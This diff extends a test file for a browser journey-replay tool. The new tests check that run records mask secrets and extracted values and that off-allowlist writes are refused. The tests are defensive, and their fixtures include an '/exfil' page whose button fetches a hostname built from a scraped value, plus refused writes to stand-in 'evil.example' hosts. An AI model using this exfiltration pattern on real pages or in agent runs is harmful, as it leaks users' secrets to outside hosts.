@@ -10,7 +10,7 @@ import type { Journey } from "@jevitate/journey";
 import { buildMcpTools } from "./mcp-api.js";
 import { buildProgram } from "./program.js";
 import { journeyReviewHash } from "./journey-review.js";
-import { JourneyRunRecorder, writePathShape, type JourneyRunRecord } from "./journey-run-record.js";
+import { journeyRouteLiterals, JourneyRunRecorder, withJourneyRunRecord, writePathShape, type JourneyRunRecord } from "./journey-run-record.js";
 import { pruneLogs } from "./logs-retention.js";
 
 // #787: which receipt a live verifier still holds (a real one needs a running proof and its signing key).
@@ -24,6 +24,7 @@ vi.mock("./journey-verify-checkpoint.js", async (original) => ({
 const SECRET = "tok_s3cret-VALUE-77";
 const PLAIN = "plain-param-value";
 const PAGE_TEXT = "PAGE-ONLY-TEXT-991";
+const EXTRACTED = "xtr4ct3d";
 
 let server: Server;
 let origin: string;
@@ -51,7 +52,7 @@ function journey(id: string, last: "ok" | "fails"): Journey {
             { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "note" } } } },
             { step: { kind: "fill", target: { testId: "note" }, value: { var: "apiKey" }, expect: { kind: "visible", target: { testId: "note" } } } },
             { step: { kind: "fill", target: { testId: "who" }, value: { var: "customer" }, expect: { kind: "visible", target: { testId: "who" } } } },
-            { step: { kind: "click", target: { testId: "send" }, expect: { kind: "visible", target: { testId: last === "ok" ? "sent" : "never" } } } },
+            { step: { kind: "click", target: { testId: "send" }, expect: { kind: "visible", target: { testId: last === "ok" ? "sent" : "never" } } }, delta: { verdict: "relevant-change", why: "s", changes: ["s"], requests: ["POST /api/v2/customers/${customer}/notes/${note} → 200"], overheadMs: 1 } },
           ],
         },
       ],
@@ -105,6 +106,10 @@ beforeAll(async () => {
     res.writeHead(200, { "content-type": "text/html" });
     if (req.method === "POST") {
       res.end(`<p data-testid=sent>${PAGE_TEXT}</p>`);
+      return;
+    }
+    if (req.url === "/exfil") {
+      res.end(`<p data-testid=code>Xtr4Ct3D</p><button data-testid=send onclick="fetch('http://Xtr4Ct3D.localhost:9/x',{method:'POST',mode:'no-cors'}).catch(()=>0)">Save</button>`);
       return;
     }
     res.end(`<p>${PAGE_TEXT}</p><form method=post action="/api/v2/customers/${PLAIN}/notes/12345?q=1"><input data-testid=note name=note><input data-testid=who name=who><button data-testid=send>Save</button></form>`);
@@ -205,13 +210,87 @@ describe("#790 the record on the CLI", () => {
   }, 60_000);
 });
 
+describe("#790 an extracted value, on a run the guard ends", () => {
+  it("is in neither the record nor the refusal", async () => {
+    const j = {
+      metadata: { id: "exfil", name: "exfil", promoted: true, params: [], createdAtIso: "2026-11-05T00:00:00.000Z" },
+      recording: {
+        version: "1",
+        site: origin,
+        pages: [{
+          url: "/exfil",
+          steps: [
+            { step: { kind: "navigate", url: "/exfil", expect: { kind: "visible", target: { testId: "code" } } } },
+            { step: { kind: "extract", target: { testId: "code" }, as: "code", expect: { kind: "visible", target: { testId: "code" } } } },
+            { step: { kind: "click", target: { testId: "send" }, expect: { kind: "visible", target: { testId: "code" } } } },
+          ],
+        }],
+      },
+    } as unknown as Journey;
+    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" };
+    writeFileSync(join(journeysDir, "exfil.json"), JSON.stringify(j));
+    const tool = buildMcpTools({ journeysDir, pathRoots: [root], runRecordLogsRoot: logs }).find((t) => t.name === "run_journey")!;
+    const text = (await tool.handler({ id: "exfil", params: {} })).content[0]!.text;
+    expect((JSON.parse(text) as { code?: string }).code, text).toBe("E_RUN_REFUSED_OFF_ALLOWLIST_WRITE");
+    expect(text.toLowerCase()).not.toContain(EXTRACTED);
+    const [one] = records();
+    expect(one!.record.writes.shapes.map((s) => s.origin)).toEqual([expect.stringContaining("[param]")]);
+    expect(one!.text.toLowerCase()).not.toContain(EXTRACTED);
+  }, 60_000);
+});
+
 describe("#790 shapes and retention", () => {
-  it("writePathShape keeps route words only", () => {
-    expect(writePathShape("/api/v2/users/42/reset-password", [])).toBe("/api/v2/users/:id/reset-password");
-    expect(writePathShape("/a/my-long-article-slug/b", [])).toBe("/a/:id/b");
-    expect(writePathShape("/u/alice/edit", ["alice"])).toBe("/u/:param/edit");
-    expect(writePathShape("/u/Alice%20B/edit", ["alice b"])).toBe("/u/:param/edit");
+  it("writePathShape keeps what the Journey recorded as literal, and nothing by its look", () => {
+    const literal = new Set(["api", "users", "reset-password", "a", "b", "u", "edit"]);
+    expect(writePathShape("/api/v2/users/42/reset-password", [], literal)).toBe("/api/v2/users/:id/reset-password");
+    expect(writePathShape("/a/my-long-article-slug/b", [], literal)).toBe("/a/:id/b");
+    expect(writePathShape("/u/alice/edit", ["alice"], literal)).toBe("/u/:param/edit");
+    expect(writePathShape("/u/Alice%20B/edit", ["alice b"], literal)).toBe("/u/:param/edit");
     expect(writePathShape("/AbC123DeF", [])).toBe("/:id");
+  });
+
+  it("a token that reads as a word stays out of a shape", () => {
+    const literal = new Set(["invite", "reset"]);
+    expect(writePathShape("/invite/brave-otter", [], literal)).toBe("/invite/:id");
+    expect(writePathShape("/reset/abcdefghijklmnopqrst", [], literal)).toBe("/reset/:id");
+    expect(writePathShape("/reset/hunter", [], literal)).toBe("/reset/:id");
+    expect(writePathShape("/invite/brave-otter", [])).toBe("/:id/:id");
+    // Recorded as literal, and a value on this run: the value wins.
+    expect(writePathShape("/invite/brave-otter", ["BRAVE-OTTER"], new Set(["invite", "brave-otter"]))).toBe("/invite/:param");
+  });
+
+  it("the literals are the Journey's own route text: no template, glob or query", () => {
+    const j = {
+      metadata: {},
+      recording: {
+        site: "https://x.test",
+        pages: [{
+          url: "https://x.test/start/here?token=abc",
+          steps: [
+            { step: { kind: "navigate", url: "/invite/${code}/open", expect: { kind: "count", target: { css: "a" }, min: 0 } } },
+            { step: { kind: "click", target: { css: "a" }, expect: { kind: "count", target: { css: "a" }, min: 0 } }, delta: { verdict: "relevant-change", why: "s", changes: ["s"], requests: ["POST /api/comments?draft=1 → 201"], overheadMs: 1 } , expectRequests: [{ kind: "requestMade", method: "POST", pathGlob: "/api/*/publish" }] },
+          ],
+        }],
+      },
+    } as unknown as Journey;
+    expect([...journeyRouteLiterals(j)].sort()).toEqual(["api", "comments", "here", "invite", "open", "publish", "start"]);
+  });
+
+  it("masks a value from an off-origin host whatever its case, and an extracted one when the run throws", async () => {
+    await withJourneyRunRecord({ channel: "mcp", id: "x", params: { token: "SeCrEtTok" }, logsRoot: logs }, async (rec) => {
+      rec.noteValue("ExTrAcTeD");
+      rec.noteRefusedWrite({ method: () => "POST", url: () => "https://SeCrEtTok.evil.example/zz" } as never);
+      rec.noteRefusedWrite({ method: () => "POST", url: () => "https://extracted.evil.example/ExTrAcTeD" } as never);
+      throw Object.assign(new Error("refused"), { code: "E_RUN_REFUSED_OFF_ALLOWLIST_WRITE", retryable: false });
+    }).catch(() => undefined);
+    const [one] = records();
+    expect(one!.record.outcome).toBe("refused");
+    expect(one!.text.toLowerCase()).not.toContain("secrettok");
+    expect(one!.text.toLowerCase()).not.toContain("extracted");
+    expect(one!.record.writes.shapes.map((s) => [s.origin, s.path])).toEqual([
+      ["https://[param].evil.example", "/:id"],
+      ["https://[param].evil.example", "/:param"],
+    ]);
   });
 
   it("write is atomic: no temp file stays, even when the write fails midway", () => {
